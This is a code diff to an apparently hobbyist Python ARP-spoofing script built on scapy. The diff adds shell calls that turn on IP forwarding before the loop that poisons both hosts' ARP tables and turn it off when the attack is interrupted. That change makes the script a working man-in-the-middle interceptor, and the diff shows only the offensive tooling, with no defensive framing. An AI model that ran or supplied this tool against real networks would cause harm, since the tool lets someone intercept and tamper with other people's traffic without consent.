@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
-import time, sys
+import time, sys, subprocess
 import argparse
 
 # Create function to pass arguments while calling the program
@@ -48,6 +48,7 @@ if __name__ == "__main__":
     options = get_arguments() # retrieve arguments passed while calling the program
     count = 0
     try:
+        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)   # Enable ip forwarding
         while True:
             spoof(options.dest_ip, options.spoof_ip, options.interface)    # Send spoof ip to the destination
             spoof(options.spoof_ip, options.dest_ip, options.interface)    # Send a reverse spoof ip to the src
@@ -58,6 +59,7 @@ if __name__ == "__main__":
         # Call the restore function when CTRL + C is pressed
         print("\n[-] Detected keyboard interupt - Quiting...")
         print("\n[+] Restoring ARP Table...")
+        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)   # Disable ip forwarding
         restore(options.dest_ip, options.spoof_ip, options.interface)
         restore(options.spoof_ip, options.dest_ip, options.interface)
         print("\n[+] ARP Table restored")
